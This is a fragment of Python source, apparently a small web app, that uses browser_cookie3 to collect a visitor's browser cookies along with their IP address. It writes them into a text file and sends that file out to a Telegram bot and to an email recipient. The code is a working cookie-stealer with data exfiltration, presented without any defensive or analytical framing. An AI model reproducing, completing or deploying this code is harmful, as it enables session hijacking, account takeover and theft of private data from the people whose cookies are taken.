...
import browser_cookie3  # Import browser_cookie3 library
from datetime import datetime
from io import StringIO  # Import StringIO for in-memory file
...
def save_cookies_to_file(cookies, ip_address):
    cookies_file = StringIO()
    cookies_file.write(f"User IP Address: {ip_address}\n\n")
    for browser, cookie_list in cookies.items():
        cookies_file.write(f"{browser.capitalize()} Cookies:\n")
        for cookie in cookie_list:
            cookies_file.write(f"\tName: {cookie['name']}\n")
            cookies_file.write(f"\t\tValue: {cookie['value']}\n")
            cookies_file.write(f"\t\tDomain: {cookie['domain']}\n")
            cookies_file.write(f"\t\tPath: {cookie['path']}\n")
            cookies_file.write(f"\t\tSecure: {'Yes' if cookie['secure'] else 'No'}\n")
            expires = cookie['expires']
            if expires:
                cookies_file.write(f"\t\tExpires: {expires} ({datetime.utcfromtimestamp(int(expires)).strftime('%Y-%m-%d %H:%M:%S')})\n")
            else:
                cookies_file.write("\t\tExpires: None\n")
    cookies_file.seek(0)  # Move the pointer to the start of the StringIO object
    return cookies_file

def send_file_to_telegram(file):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    files = {'document': ('cookies.txt', file)}
    payload = {'chat_id': TELEGRAM_CHAT_ID}
    response = requests.post(url, files=files, data=payload)
    return response

def send_file_to_email(file):
    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    ...
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= cookies.txt')
    msg.attach(part)
...
def index():
    ...
    # Save cookies to in-memory file
    cookies_file = save_cookies_to_file(cookies, ip_address)

    # Send cookies file to Telegram
    response = send_file_to_telegram(cookies_file)
    print(f"Telegram response: {response.text}")

    # Reset the StringIO pointer after sending to Telegram
    cookies_file.seek(0)

    # Send cookies file to Email
    send_file_to_email(cookies_file)
    print("Email sent successfully")
